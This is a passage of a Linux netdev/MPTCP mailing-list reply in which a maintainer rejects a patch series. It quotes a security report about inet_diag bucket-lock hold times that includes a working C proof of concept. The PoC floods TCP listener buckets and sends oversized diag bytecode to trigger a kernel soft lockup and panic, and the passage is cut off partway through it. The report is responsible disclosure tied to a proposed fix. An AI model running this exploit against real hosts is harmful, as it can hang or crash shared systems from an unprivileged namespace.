Received: from mail-pg1-f179.google.com (mail-pg1-f179.google.com [209.85.215.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 303DE31E83D
	for <mptcp@lists.linux.dev>; Thu,  3 Sep 2026 02:09:17 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.179
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788401360; cv=pass; b=fpOou12q9EqP2yKbkcTAC5vJpzGOfvJlPIiZ9N3cUPwSaP0R5hk9EOiWmZyoDnLQYD2ixgezfp3fY4e9P+7VUSkx9L0feUjJQ96vuEm3xPIRa+mrkAwJkBZpUrFPiCLjRMbWSYmKgi91u6QnTySlRODWmpZIrq9a997G7t60L+M=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788401360; c=relaxed/simple;
	bh=BA99AHUhlOllf+DJ3+k/mu49vgeSXWmufuyyY6bJzWU=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=WCIPmACERgP7F3D2p1UcvVnVFWTL//SHAy2wIZkLqHDfGw1HpeIJTFTwJaNsZnnTRj8YUXjUxKJac3cgoAJB6e8Z5VGgSfApR6czF5tZnl4eAq4TFLmfHJbDGv1Jgq1S04lhvPneCS3J2sgIawTuWH/Y9/qyZmRRuHkc4ilm6Ds=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com; spf=pass smtp.mailfrom=google.com; dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b=YTEiK2/u; arc=pass smtp.client-ip=209.85.215.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=google.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="YTEiK2/u"
Received: by mail-pg1-f179.google.com with SMTP id 41be03b00d2f7-cc1c7364550so2007876a12.1
        for <mptcp@lists.linux.dev>; Wed, 02 Sep 2026 19:09:17 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1788401357; cv=none;
        d=google.com; s=arc-20260327;
        b=g1PeW0nUiCv/vaoIfbT/lbqrsuCtaN0yYi0nH2WU7z0QM6cNVj4ccJkk+XZe9vAyGg
         6O4spj8wJ9TtHder+yEmM24zcv6l7gYGuSLgXUgNsZa9INZ2ixHseGGrXHjj8YtRzGL1
         kTSZZXlU9CzbfMRjzyPZYG0LwCqCj0+O8Zy41uN52NSgkEbDjNO7Am2yn08R/rD8Im3y
         jukrZjiBn3HKramhEJifVcGgU8v+R5rszhT5sHcWRyRERf2ujSfzX5uU+kG2cj+Jt75J
         nZPwMJZzB9G+52XvOih6Ihztab/cdtZbWRNB4D8RWQDDjo7AyRR5I+TvjJjf9N5jaWQ5
         SYSA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=LfrjA81ocv3KPtLh8k+gEf1dFlity+RszM2m8Wh9Rso=;
        fh=2NZ1AEHpftCMJT9dHV7ZZvswSqRG8nPeSKUH2GHQS0U=;
        b=Sw3H7W1jGSB0+Lx+64IcS3Yxu8enH9GvMxT3Gx/H3JluPUztky+EobKGoauea60u2V
         nRIRe0PU49mDK2VKdK9r7N4RwhnNkcE+dJswdQ0tqmvZ82j2YVjNBCRRmWg12hLPlklK
         f8M9rNmA4BAKGkIYoJ1FvTtyLggB4e1bJfe12IpjGnJt/VxCRISsgLt2GYltfj4or4ts
         nu1xSGhm1BDBuwUcCMiGowNOWd8S1MT8FBufy2D5xnVBvI6F06KGkKXlVn47FlWblk9V
         1B5Mr9gk+XDetmNKmGGSsjOfmHmyVghSVKeur8nC8lH/TtrseVPKcqrTOyrdl2pOjoBk
         vcsQ==;
        darn=lists.linux.dev
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20251104; t=1788401357; x=1789006157; darn=lists.linux.dev;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=LfrjA81ocv3KPtLh8k+gEf1dFlity+RszM2m8Wh9Rso=;
        b=YTEiK2/uUNxkH/HKRS66nwdSL7INrzblM+99Njq6szj9wrMVnOVRH/R2Xl+kDr1FTa
         dHKrZ66MhvLgE10b5FzCYsP15Zt3ePcSsqJKVUVyh5wXMaW9vQWwbyRH9PgjGTGoMUN0
         D+A0PCXjnwq/wbaWaFcb2vP574XlqUF2jZXdzBD1VYV5wxc4M6Z5jv7UQORXrgIIn6kF
         xYrcaQCRR/IWP856yVCDEKCnFa52q7G3nb3e4VqZr3e4u0XinwhplW05Nhv3/UZeY83Z
         ZjoHaUcnxENBtbHtdmQUyiOHYMgqnSBQsR5H+ror7WbvbLcsssF3JAvFGsyromyEd07q
         2Nmw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788401357; x=1789006157;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=LfrjA81ocv3KPtLh8k+gEf1dFlity+RszM2m8Wh9Rso=;
        b=HM6zWQtAF/LK7zlTxzsTwHveHdePIMwL74Kml5pu+fI8HnSoxTXEJv+htvtDzygftR
         6QZcd3G3e/lFwikx8kKQKXEqLYwI6SrAAdBfSUfUT4BRjA/40ITa2K0UvYIbCv+GHcuB
         zwuW8TuYnrmChFmddoXcd8XQcwTr2Bu7JZCvnZUhIpwO4wfjgZOo+scJgsVh2L9J/Y4s
         UA8jbOs6yvUbZIGdwzwlyw7EDvzuP0tIcYiz6Rj0axZeOFmeKT2DrvJXDgoPey+SyQCI
         XUods40YOGVvIaPbzdXKBIxDXF3M9ENCbOgqNlS+6A8Vpza1LdFGUfaH8Ea83QTsK1xW
         z0rA==
X-Forwarded-Encrypted: i=1; AKwUvBxPx2PUF9matUq7ibKLeRqJzOdIigDjgFG394zH/fZVa5rMIT80yr0LwJtcyGFHlEBHVYTnwA==@lists.linux.dev
X-Gm-Message-State: AFuF++nDOaGnoiO7TBlIJ9bhAt2UFj/QPfe08eIrvcGUfJRPm2UIvk84
	DLM0To86syt4XDDSmBaZOZHW5zAMLzWc8qPsVdexsRExl9Xv7NdFNNKcEOt3NnDRFaHySKYHABt
	RJlH47J3v91KunSfNHLbBuQL3fxLuxUXovdcgzRlq
X-Gm-Gg: AYBFou0XEN5daRjqKYoJFfgKEGljFH59KpMkp15iZvQy4a7QXTMASBB46SovHQ5Hjuc
	NrqcimUJuEyAukBR2X1eXeybxWBOH3HLNphhx8h/VaL7IDdXoWFGaHMn/b8JHfuf3lA1IDAk4Sf
	u6HNFIaSMFu7gSGRqigAyNciwcUPolI392RjalBvxN5K13evEj7H+WL0VcP4Wl7RzhLrIJ63U6T
	Fo0CETCABXB+cI4DylFOEnH/TmOK43f/67qnvBzm/iqAYZSqOsoxayKLvH1ODlInMQkCoRONGHA
	ah+u9xyerroYuiquktTLO9hTbFqAopVKsLHZ9nUxyDeDnWXrP5Pdf5bguh1IqqPcQtziwuK1OWh
	sWcHu85M/pE7DQRgD08ZDKO0+vfgJKUU6ZpgmXqyr9sjtlBgiAXazzJ7VX5jBxNhyjCwmtZSXrY
	bzgpHBvOcAQOsh
X-Received: by 2002:a17:90a:114f:b0:399:1b08:28de with SMTP id
 98e67ed59e1d1-39b13247f46mr1051876a91.7.1788401356356; Wed, 02 Sep 2026
 19:09:16 -0700 (PDT)
Precedence: bulk
X-Mailing-List: mptcp@lists.linux.dev
List-Id: <mptcp.lists.linux.dev>
List-Subscribe: <mailto:mptcp+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:mptcp+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
References: <cover.1788248601.git.zihanx@nebusec.ai>
In-Reply-To: <cover.1788248601.git.zihanx@nebusec.ai>
From: Kuniyuki Iwashima <kuniyu@google.com>
Date: Wed, 2 Sep 2026 19:09:05 -0700
X-Gm-Features: AcwNN1Vizkb-eAuhuPdbnsgcakhsca7qcknZRCz_kW1M-sOZMcmgKOZ52qRZ_b4
Message-ID: <CAAVpQUDMSKo6S5CADED41XMxvxBVWpQfcNbvebGWc4hg6mROHw@mail.gmail.com>
Subject: Re: [PATCH net v2 0/2] tcp: diag: bound bucket lock hold in diag dump paths
To: Zihan Xi <zihanx@nebusec.ai>
Cc: netdev@vger.kernel.org, linux-kernel@vger.kernel.org, 
	mptcp@lists.linux.dev, "David S . Miller" <davem@davemloft.net>, 
	Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, 
	Simon Horman <horms@kernel.org>, Neal Cardwell <ncardwell@google.com>, 
	Matthieu Baerts <matttbe@kernel.org>, Mat Martineau <martineau@kernel.org>, 
	Geliang Tang <geliang@kernel.org>, Guillaume Nault <gnault@redhat.com>, Florian Westphal <fw@strlen.de>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Tue, Sep 1, 2026 at 5:53=E2=80=AFAM Zihan Xi <zihanx@nebusec.ai> wrote:
>
> Hi Linux kernel maintainers,
>
> We found and validated an issue in net/ipv4/tcp_diag.c and
> net/mptcp/mptcp_diag.c. The bug is reachable by a
> non-root user via user and net namespace.
> Our testing did not identify any impact on other functionality.
>
> We will provide detailed information about the bug
> in this email, along with a PoC to trigger it.
>
> ---- details below ----
>
> Bug details:
>
> inet_diag TCP dumps currently execute request-supplied
> INET_DIAG_REQ_BYTECODE programs while still holding the listener, bind,
> or ehash bucket locks in tcp_diag_dump(). With a heavily populated
> bucket, the time spent under the same lock grows with both raw socket
> traversal and bytecode cost.
>
> The local listener reproducer creates four SO_REUSEPORT groups of 32768
> listeners each, 131072 sockets in total, and then issues a
> NETLINK_SOCK_DIAG dump request with 16380 INET_DIAG_BC_NOP instructions

Same feedback as v1.

tcp_diag_dump() is long enough, and I don't think that the "fix"
to avoid a long loop on *QEMU* due to an unreal setup is worth
300 LoC(hurn).




> followed by a failing INET_DIAG_BC_D_EQ test. This is a deliberately
> concentrated setup to make the lock scope observable; it is not intended
> to represent a typical deployment. Because every socket runs the full
> bytecode and none reaches the reply fill path, skb backpressure does not
> terminate the walk early.
> On the unfixed kernel, with local softlockup panic sysctls enabled, this
> makes the long bucket-locked section visible as a watchdog report and
> panic in inet_diag_bc_sk().
>
> The earlier batching fix direction was still too narrow: it only counted
> sockets that survived the cheap prefilters and reached the expensive dump
> path. An attacker can therefore populate one bucket with many sockets or
> listeners that fail the netns/family/port or MPTCP-specific prefilters,
> causing the same bucket lock to be scanned far past the 16-entry batch
> threshold before control is returned.
>
> The same root cause also exists in MPTCP listener dumping. The
> MPTCP-specific mptcp_diag_dump_listeners() path reuses sk_diag_dump(),
> which runs inet_diag_bc_sk() before filling the netlink reply, while the
> listener bucket lock is still held.
>
> The inline reproducer and decoded crash log below cover the TCP watchdog
> path only. They are not an MPTCP crash reproduction. The crash log is the
> decoded output of `./scripts/decode_stacktrace.sh`, with source paths
> reduced to repository-relative file and line references for review. The
> MPTCP patch addresses the equivalent listener lock scope identified by
> code inspection and completed MPTCP listener stress tests. A separate
> MPTCP crash artifact is not included, because the fixed MPTCP run
> completed without a crash.
>
> This series fixes both sites by keeping bucket-locked sections limited to
> raw socket collection and lifetime pinning, and moving all filtering,
> inet_diag_bc_sk(), and socket filling work out of the locked regions so
> the batch limit applies to raw bucket traversal itself. For TCP listener,
> bind, and ehash buckets, and for the MPTCP listener bucket, restarts now
> keep a referenced dump cursor so the next batch resumes after the
> previous socket instead of rescanning the bucket head under the same
> lock. A stored cursor is reused only after it is checked against the
> currently locked bucket. Listen and ehash resume also require the socket
> state to still belong to that table. Current-bucket membership is inferre=
d
> from that state plus the recomputed hash slot. If the check fails,
> collection restarts from the bucket head with the same batch limit. That
> fallback can emit a socket more than once, but it does not move bytecode
> or fill work back under the bucket lock. Bind collection counts TIME_WAIT
> nodes toward the batch limit and restores them through tw_tb2.
>
> We also ran targeted cursor-resume stress tests on the fixed kernel. The
> TCP listener workload used 131072 listeners while a separate thread
> repeatedly removed and recreated listeners across listener buckets. Three
> runs completed in 17024.089 ms, 17217.245 ms, and 17180.322 ms, and the
> guest remained alive. With temporary kernel instrumentation, one run
> directly observed an invalid TCP listener cursor: the cursor was unhashed
> and its computed bucket differed from the bucket being scanned, after
> which the safe restart path completed normally.
>
> A corresponding MPTCP listener workload and a TCP bound-only close/rebind
> workload also completed without a crash, and the guest remained alive.
> Neither workload deterministically reached its instrumented invalid-curso=
r
> branch, and no crash artifact is claimed for either path.
>
> For ehash, a dedicated workload created 4096 loopback established TCP
> connections while a mutator replaced connection pairs concurrently. The
> TCPF_ALL inet_diag dump completed in 315.108 ms. No ehash invalid-cursor
> log, soft lockup, or panic was observed. These tests exercise the relevan=
t
> mutation and resume paths, but do not claim deterministic scheduling of
> every race between two dump callbacks.
>
> The TCP patch uses two Fixes tags for the path-specific introductions:
> commit 5caea4ea7088 ("net: listening_hash get a spinlock per bucket")
> introduced the listener bucket spinlock, and commit 91051f003948
> ("tcp: Dump bound-only sockets in inet_diag.") introduced the bound-only
> path. The ehash dump already ran diagnostic work under the bucket lock
> before 7e3aab4a9cd7, which only converted that lock from read_lock_bh()
> to spin_lock_bh(), so that commit is not used as a Fixes tag. The MPTCP
> patch uses commit 4fa39b701ce9 ("mptcp: listen diag dump support").
>
> udp_diag and raw diag still run bytecode and fill under their own hash
> slot locks. Those locks are not the TCP listener, bind, or ehash locks,
> or the MPTCP listener lock, tightened by this series.
>
> Reproducer:
>
>     gcc -O2 -static -o poc poc.c
>     unshare -Urn ./poc
>
> This is not a packet-sequence or protocol-state reproducer. The trigger
> depends on creating many sockets and issuing NETLINK_SOCK_DIAG requests,
> which packetdrill cannot express, so the PoC uses sockets and Netlink
> directly.
>
> To make the long bucket-locked section observable in the local QEMU
> run below, we enabled softlockup panic sysctls as guest root. The
> unshare command above uses the PoC defaults, which are:
>
>     ./poc --listen --groups 4 --stride 2048 --count 32768 --nops 16380
>
> The crash log reports UID: 0 because that process is the userns root
> created by unshare -Urn, after those sysctls were set as guest root.
> That UID does not by itself prove a host-unprivileged run. The inet_diag
> dump path itself is reachable from a user and net namespace.
>
> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
>
> ------BEGIN poc.c------
> #define _GNU_SOURCE
>
> #include <arpa/inet.h>
> #include <errno.h>
> #include <linux/inet_diag.h>
> #include <linux/netlink.h>
> #include <linux/sock_diag.h>
> #include <linux/tcp.h>
> #include <sched.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/resource.h>
> #include <sys/socket.h>
> #include <sys/time.h>
> #include <time.h>
> #include <unistd.h>
>
> #ifndef SOL_TCP
> #define SOL_TCP 6
> #endif
>
> #ifndef TCP_LISTEN
> #define TCP_LISTEN 10
> #endif
>
> #define TCPF_LISTEN (1U << TCP_LISTEN)
>
> #ifndef TCP_BOUND_INACTIVE
> #define TCP_BOUND_INACTIVE 13
> #endif
> #ifndef TCPF_BOUND_INACTIVE
> #define TCPF_BOUND_INACTIVE (1U << TCP_BOUND_INACTIVE)
> #endif
>
> #define DEFAULT_SOCKETS 32768U
> #define DEFAULT_NOPS 16380U
> #define DEFAULT_REPEAT 1U
> #define DEFAULT_GROUPS 4U
> #define DEFAULT_STRIDE 2048U
> #define DEFAULT_BASE_PORT 10000
> #define MAX_NOPS 16380U
> #define RECV_BUF_SIZE (1U << 20)
>
> struct options {
>         unsigned int sockets;
>         unsigned int nops;
>         unsigned int repeat;
>         unsigned int groups;
>         unsigned int stride;
>         unsigned int cpu;
>         bool cpu_set;
>         bool compare;
>         bool attack;
>         bool listen_mode;
>         int port;
> };
>
> static void usage(const char *prog)
> {
>         fprintf(stderr,
>                 "Usage: %s [--count N] [--nops N] [--repeat N] [--port P]=
 [--cpu N]\n"
>                 "          [--groups N] [--stride N] [--compare] [--no-at=
tack]\n"
>                 "          [--listen | --bound]\n"
>                 "Defaults: --count %u --nops %u --repeat %u\n",
>                 prog, DEFAULT_SOCKETS, DEFAULT_NOPS, DEFAULT_REPEAT);
> }
>
> static long long timespec_delta_ns(const struct timespec *start,
>                                        const struct timespec *end)
> {
>         return (end->tv_sec - start->tv_sec) * 1000000000LL +
>                (end->tv_nsec - start->tv_nsec);
> }
>
> static int raise_nofile_limit(rlim_t needed)
> {
>         struct rlimit lim;
>
>         if (getrlimit(RLIMIT_NOFILE, &lim) < 0) {
>                 perror("getrlimit(RLIMIT_NOFILE)");
>                 return -1;
>         }
>
>         if (lim.rlim_cur >=3D needed)
>                 return 0;
>
>         if (lim.rlim_max < needed)
>                 needed =3D lim.rlim_max;
>
>         lim.rlim_cur =3D needed;
>         if (setrlimit(RLIMIT_NOFILE, &lim) < 0) {
>                 perror("setrlimit(RLIMIT_NOFILE)");
>                 return -1;
>         }
>
>         if (getrlimit(RLIMIT_NOFILE, &lim) < 0) {
>                 perror("getrlimit(RLIMIT_NOFILE)");
>                 return -1;
>         }
>
>         if (lim.rlim_cur < needed) {
>                 fprintf(stderr, "RLIMIT_NOFILE stayed at %llu, need %llu\=
n",
>                         (unsigned long long)lim.rlim_cur,
>                         (unsigned long long)needed);
>                 return -1;
>         }
>
>         return 0;
> }
>
> static int pin_to_cpu(unsigned int cpu)
> {
>         cpu_set_t set;
>
>         CPU_ZERO(&set);
>         CPU_SET(cpu, &set);
>         if (sched_setaffinity(0, sizeof(set), &set) < 0) {
>                 perror("sched_setaffinity");
>                 return -1;
>         }
>
>         return 0;
> }
>
> static int create_socket_in_bucket(bool listen_mode, int port, int *bound=
_port)
> {
>         struct sockaddr_in addr =3D {
>                 .sin_family =3D AF_INET,
>                 .sin_addr.s_addr =3D htonl(INADDR_ANY),
>         };
>         socklen_t addrlen =3D sizeof(addr);
>         int one =3D 1;
>         int fd;
>
>         fd =3D socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
>         if (fd < 0) {
>                 perror("socket(AF_INET, SOCK_STREAM)");
>                 return -1;
>         }
>
>         if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) <=
 0) {
>                 perror("setsockopt(SO_REUSEADDR)");
>                 goto err;
>         }
>
>         if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one)) <=
 0) {
>                 perror("setsockopt(SO_REUSEPORT)");
>                 goto err;
>         }
>
>         addr.sin_port =3D htons(port);
>         if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
>                 perror("bind");
>                 goto err;
>         }
>
>         if (getsockname(fd, (struct sockaddr *)&addr, &addrlen) < 0) {
>                 perror("getsockname");
>                 goto err;
>         }
>
>         if (listen_mode) {
>                 if (listen(fd, 0) < 0) {
>                         perror("listen");
>                         goto err;
>                 }
>         }
>
>         *bound_port =3D ntohs(addr.sin_port);
>         return fd;
>
> err:
>         close(fd);
>         return -1;
> }
>
> static int setup_sockets(bool listen_mode, unsigned int groups,
>                          unsigned int count_per_group, unsigned int strid=
e,
>                          int requested_port, int **fds_out, int *port_out=
)
> {
>         int *fds;
>         unsigned int g, i;
>         unsigned int total =3D groups * count_per_group;
>         int base_port =3D requested_port ? requested_port : DEFAULT_BASE_=
PORT;
>
>         fds =3D calloc(total, sizeof(*fds));
>         if (!fds) {
>                 perror("calloc(socket fds)");
>                 return -1;
>         }
>
>         for (g =3D 0; g < groups; g++) {
>                 int port =3D base_port + (int)(g * stride);
>
>                 if (port <=3D 0 || port > 65535) {
>                         fprintf(stderr, "port overflow for group %u (base=
=3D%d stride=3D%u)\n",
>                                 g, base_port, stride);
>                         goto err;
>                 }
>
>                 for (i =3D 0; i < count_per_group; i++) {
>                         unsigned int idx =3D g * count_per_group + i;
>                         int bound_port =3D port;
>                         int fd =3D create_socket_in_bucket(listen_mode, b=
ound_port,
>                                                          &bound_port);
>
>                         if (fd < 0) {
>                                 fprintf(stderr,
>                                         "socket setup failed at group %u =
index %u (port %d)\n",
>                                         g, i, port);
>                                 goto err;
>                         }
>
>                         fds[idx] =3D fd;
>                         if ((idx + 1) % 4096U =3D=3D 0 || idx + 1 =3D=3D =
total) {
>                                 printf("sockets_ready=3D%u group=3D%u por=
t=3D%d mode=3D%s\n",
>                                        idx + 1, g + 1, port,
>                                        listen_mode ? "listen" : "bound");
>                         }
>                 }
>         }
>
>         *fds_out =3D fds;
>         *port_out =3D base_port;
>         return 0;
>
> err:
>         for (i =3D 0; i < total; i++) {
>                 if (fds[i] > 0)
>                         close(fds[i]);
>         }
>         free(fds);
>         return -1;
> }
>
> static void teardown_sockets(int *fds, unsigned int count)
> {
>         unsigned int i;
>
>         if (!fds)
>                 return;
>
>         for (i =3D 0; i < count; i++) {
>                 if (fds[i] >=3D 0)
>                         close(fds[i]);
>         }
>         free(fds);
> }
>
> static size_t build_request(void *buf, bool listen_mode, bool with_attack=
,
>                             unsigned int nops)
> {
>         size_t msg_len =3D NLMSG_SPACE(sizeof(struct inet_diag_req_v2));
>         struct nlmsghdr *nlh =3D buf;
>         struct inet_diag_req_v2 *req;
>
>         memset(buf, 0, msg_len);
>         nlh->nlmsg_len =3D msg_len;
>         nlh->nlmsg_type =3D SOCK_DIAG_BY_FAMILY;
>         nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_DUMP;
>         nlh->nlmsg_seq =3D 1;
>
>         req =3D NLMSG_DATA(nlh);
>         req->sdiag_family =3D AF_INET;
>         req->sdiag_protocol =3D IPPROTO_TCP;
>         req->idiag_states =3D listen_mode ? TCPF_LISTEN : TCPF_BOUND_INAC=
TIVE;
>         req->id.idiag_cookie[0] =3D INET_DIAG_NOCOOKIE;
>         req->id.idiag_cookie[1] =3D INET_DIAG_NOCOOKIE;
>
>         if (with_attack) {
>                 size_t payload_len =3D ((size_t)nops + 2U) *
>                                      sizeof(struct inet_diag_bc_op);
>                 size_t attr_len =3D NLA_HDRLEN + payload_len;
>                 struct nlattr *nla =3D (struct nlattr *)((char *)buf + ms=
g_len);
>                 struct inet_diag_bc_op *ops;
>                 unsigned int i;
>
>                 memset(nla, 0, NLA_ALIGN(attr_len));
>                 nla->nla_type =3D INET_DIAG_REQ_BYTECODE;
>                 nla->nla_len =3D attr_len;
>                 ops =3D (struct inet_diag_bc_op *)((char *)nla + NLA_HDRL=
EN);
>
>                 for (i =3D 0; i < nops; i++) {
>                         ops[i].code =3D INET_DIAG_BC_NOP;
>                         ops[i].yes =3D sizeof(struct inet_diag_bc_op);
>                         ops[i].no =3D 0;
>                 }
>
>                 ops[nops].code =3D INET_DIAG_BC_D_EQ;
>                 ops[nops].yes =3D 2U * sizeof(struct inet_diag_bc_op);
>                 ops[nops].no =3D 3U * sizeof(struct inet_diag_bc_op);
>
>                 ops[nops + 1].code =3D 0;
>                 ops[nops + 1].yes =3D 0;
>                 ops[nops + 1].no =3D 1;
>
>                 msg_len +=3D NLA_ALIGN(attr_len);
>                 nlh->nlmsg_len =3D msg_len;
>         }
>
>         return msg_len;
> }
>
> static int recv_until_done(int fd)
> {
>         char *buf;
>         int ret =3D 0;
>
>         buf =3D malloc(RECV_BUF_SIZE);
>         if (!buf) {
>                 perror("malloc(recv buf)");
>                 return -1;
>         }
>
>         for (;;) {
>                 ssize_t received =3D recv(fd, buf, RECV_BUF_SIZE, 0);
>                 struct nlmsghdr *nlh;
>                 int remaining;
>
>                 if (received < 0) {
>                         perror("recv");
>                         ret =3D -1;
>                         break;
>                 }
>
>                 if (received =3D=3D 0) {
>                         fprintf(stderr, "recv: unexpected EOF\n");
>                         ret =3D -1;
>                         break;
>                 }
>
>                 remaining =3D (int)received;
>                 for (nlh =3D (struct nlmsghdr *)buf; NLMSG_OK(nlh, remain=
ing);
>                      nlh =3D NLMSG_NEXT(nlh, remaining)) {
>                         if (nlh->nlmsg_type =3D=3D NLMSG_DONE)
>                                 goto out;
>
>                         if (nlh->nlmsg_type =3D=3D NLMSG_ERROR) {
>                                 const struct nlmsgerr *err =3D NLMSG_DATA=
(nlh);
>
>                                 if (nlh->nlmsg_len < NLMSG_LENGTH(sizeof(=
*err))) {
>                                         fprintf(stderr, "short NLMSG_ERRO=
R\n");
>                                 } else if (err->error) {
>                                         errno =3D -err->error;
>                                         perror("netlink");
>                                 } else {
>                                         fprintf(stderr, "unexpected ACK\n=
");
>                                 }
>                                 ret =3D -1;
>                                 goto out;
>                         }
>                 }
>         }
>
> out:
>         free(buf);
>         return ret;
> }
>
> static int run_dump(bool listen_mode, bool with_attack, unsigned int nops=
,
>                     double *wall_ms)
> {
>         size_t request_len;
>         size_t attr_space =3D with_attack ?
>                             NLA_ALIGN(NLA_HDRLEN +
>                                       ((size_t)nops + 2U) *
>                                       sizeof(struct inet_diag_bc_op)) : 0=
;
>         size_t alloc_len =3D NLMSG_SPACE(sizeof(struct inet_diag_req_v2))=
 +
>                            attr_space;
>         struct sockaddr_nl local =3D {
>                 .nl_family =3D AF_NETLINK,
>         };
>         struct sockaddr_nl kernel =3D {
>                 .nl_family =3D AF_NETLINK,
>         };
>         struct timeval timeout =3D {
>                 .tv_sec =3D 60,
>                 .tv_usec =3D 0,
>         };
>         struct iovec iov;
>         struct msghdr msg =3D {
>                 .msg_name =3D &kernel,
>                 .msg_namelen =3D sizeof(kernel),
>                 .msg_iov =3D &iov,
>                 .msg_iovlen =3D 1,
>         };
>         struct timespec start_ts;
>         struct timespec end_ts;
>         void *request;
>         int fd;
>         int ret =3D -1;
>
>         request =3D malloc(alloc_len);
>         if (!request) {
>                 perror("malloc(request)");
>                 return -1;
>         }
>
>         request_len =3D build_request(request, listen_mode, with_attack, =
nops);
>
>         fd =3D socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_SOCK_D=
IAG);
>         if (fd < 0) {
>                 perror("socket(AF_NETLINK)");
>                 free(request);
>                 return -1;
>         }
>
>         if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(time=
out)) < 0) {
>                 perror("setsockopt(SO_RCVTIMEO)");
>                 goto out;
>         }
>
>         if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {
>                 perror("bind(netlink)");
>                 goto out;
>         }
>
>         iov.iov_base =3D request;
>         iov.iov_len =3D request_len;
>
>         if (clock_gettime(CLOCK_MONOTONIC_RAW, &start_ts) < 0) {
>                 perror("clock_gettime(start)");
>                 goto out;
>         }
>
>         if (sendmsg(fd, &msg, 0) < 0) {
>                 perror("sendmsg");
>                 goto out;
>         }
>
>         if (recv_until_done(fd) < 0)
>                 goto out;
>
>         if (clock_gettime(CLOCK_MONOTONIC_RAW, &end_ts) < 0) {
>                 perror("clock_gettime(end)");
>                 goto out;
>         }
>
>         *wall_ms =3D (double)timespec_delta_ns(&start_ts, &end_ts) / 1000=
000.0;
>         ret =3D 0;
>
> out:
>         close(fd);
>         free(request);
>         return ret;
> }
>
> static int parse_u32(const char *arg, unsigned int *value)
> {
>         char *end =3D NULL;
>         unsigned long parsed;
>
>         parsed =3D strtoul(arg, &end, 0);
>         if (!end || *end || parsed > UINT32_MAX)
>                 return -1;
>
>         *value =3D (unsigned int)parsed;
>         return 0;
> }
>
> static int parse_port(const char *arg, int *port)
> {
>         unsigned int value;
>
>         if (parse_u32(arg, &value) < 0 || value > 65535U)
>                 return -1;
>
>         *port =3D (int)value;
>         return 0;
> }
>
> int main(int argc, char **argv)
> {
>         struct options opts =3D {
>                 .sockets =3D DEFAULT_SOCKETS,
>                 .nops =3D DEFAULT_NOPS,
>                 .repeat =3D DEFAULT_REPEAT,
>                 .groups =3D DEFAULT_GROUPS,
>                 .stride =3D DEFAULT_STRIDE,
>                 .cpu =3D 0,
>                 .cpu_set =3D false,
>                 .compare =3D false,
>                 .attack =3D true,
>                 .listen_mode =3D true,
>                 .port =3D 0,
>         };
>         int *fds =3D NULL;
>         int port =3D 0;
>         unsigned int i;
>
>         for (i =3D 1; i < (unsigned int)argc; i++) {
>                 if (strcmp(argv[i], "--count") =3D=3D 0) {
>                         if (i + 1 >=3D (unsigned int)argc ||
>                             parse_u32(argv[++i], &opts.sockets) < 0 ||
>                             opts.sockets =3D=3D 0) {
>                                 usage(argv[0]);
>                                 return 1;
>                         }
>                 } else if (strcmp(argv[i], "--nops") =3D=3D 0) {
>                         if (i + 1 >=3D (unsigned int)argc ||
>                             parse_u32(argv[++i], &opts.nops) < 0 ||
>                             opts.nops > MAX_NOPS) {
>                                 fprintf(stderr, "--nops must be in range =
[0, %u]\n",
>                                         MAX_NOPS);
>                                 return 1;
>                         }
>                 } else if (strcmp(argv[i], "--repeat") =3D=3D 0) {
>                         if (i + 1 >=3D (unsigned int)argc ||
>                             parse_u32(argv[++i], &opts.repeat) < 0 ||
>                             opts.repeat =3D=3D 0) {
>                                 usage(argv[0]);
>                                 return 1;
>                         }
>                 } else if (strcmp(argv[i], "--groups") =3D=3D 0) {
>                         if (i + 1 >=3D (unsigned int)argc ||
>                             parse_u32(argv[++i], &opts.groups) < 0 ||
>                             opts.groups =3D=3D 0) {
>                                 usage(argv[0]);
